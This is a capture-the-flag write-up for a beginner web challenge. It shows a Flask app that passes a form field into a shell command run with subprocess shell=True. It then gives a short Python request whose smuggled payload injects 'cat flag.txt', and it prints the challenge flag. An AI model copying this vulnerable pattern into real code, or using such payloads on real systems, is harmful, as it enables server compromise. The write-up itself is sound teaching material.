# pawnedhaveibeen

[library.m0unt41n.ch/challenges/pawnedhaveibeen](https://library.m0unt41n.ch/challenges/pawnedhaveibeen) ![](../../resources/web.svg) ![](../../resources/baby.svg) 

# TL;DR

We get a Flask app, with source code and a well-visible shell injection vector:

# Code

DB initialization:

```sql
CREATE DATABASE IF NOT EXISTS pawned;
USE pawned;
CREATE TABLE IF NOT EXISTS pwned_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    pwned_user VARCHAR(255)
);
INSERT INTO pwned_users (pwned_user) VALUES ('john.doe@example.net');
```

Application:

```python
import os
from flask import Flask, render_template, request
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check', methods=['POST'])
def check_pawn():
    username_or_email = request.form['username_or_email']
    mysql_username = os.environ.get('MYSQL_USERNAME')
    mysql_password = os.environ.get('MYSQL_PASSWORD')
    command = f'mysql -u {mysql_username} -p{mysql_password} -D pawned -e "SELECT * FROM pwned_users WHERE pwned_user = \'{username_or_email}\';"'
    try:
        result = subprocess.run(command, shell=True, capture_output=True)
        if result.stdout:
            message = "Oh no — pwned! Your user " + result.stdout.decode('utf-8')[result.stdout.decode('utf-8').rfind('\t') + 1:] + " has been pawned. Please update all your passwords. Also, consider reading our <a href='/security-education'>security education page</a> for tips on improving your online security."
        else:
            message = "Good news — no pwnage found! Your user is not pawned. Keep up the good work on maintaining strong passwords. Also, consider reading our <a href='/security-education'>security education page</a> for tips on improving your online security."
        return render_template('index.html', result=message)
    except subprocess.CalledProcessError as e:
        return "Error executing SQL query"

@app.route('/donate')
def donate():
    return render_template('donate.html')

@app.route('/security-education')
def security_education():
    return render_template('sec_edu.html')

if __name__ == '__main__':
    app.run(debug=False, template_folder='templates')

```

App startup:

```bash
export FLASK_DEBUG=0
service mariadb start
while ! mysqladmin ping -hlocalhost -uroot -p"redacted" --silent; do
    sleep 1
done
mysql -uroot -p"redacted" < /docker-entrypoint-initdb.d/init.sql
flask run --port=5000 --no-reload --host=0.0.0.0
```

# Getting the flag

We just need to craft `username_or_email` to get the shell executed by
`subprocess.run()` to do what we want.

```python
import requests
import re

URL = "https://xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.library.m0unt41n.ch:1337/check"
PARAMS = {'username_or_email': "user';\";cat flag.txt;echo \""}
html = requests.post(url=URL, data=PARAMS).text
print(re.compile('Your user ([^}]*})').findall(html)[0])
```

---

## `flag{Inject_Your_Way_to_Victory}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
